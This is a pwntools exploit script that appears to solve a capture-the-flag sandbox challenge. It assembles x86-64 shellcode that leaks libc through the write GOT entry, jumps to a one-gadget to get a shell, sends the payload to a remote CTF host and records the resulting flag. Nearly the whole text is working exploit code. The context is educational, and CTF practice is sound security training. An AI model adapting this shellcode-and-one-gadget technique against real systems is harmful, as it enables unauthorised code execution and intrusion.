from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

sc = asm(
    """
call rax
mov rax, [rip-18] # rax = call_reg_monitor
add rax, 0x2c06 # rax = write@got
mov rax, [rax]
sub rax, 0x1111d0 # rax = libc
add rax, 0xe6c84 # rax = one gadget
xor rsi, rsi
xor rdx, rdx
jmp rax
"""
)
print(disasm(sc))

# io = gdb.debug("./sandbox_bin_patched", "b *(main+968)\nc")
io = remote("edu-ctf.zoolab.org", 30202)
io.send(sc)
io.interactive()

# FLAG{It_is_a_bad_sandbox}
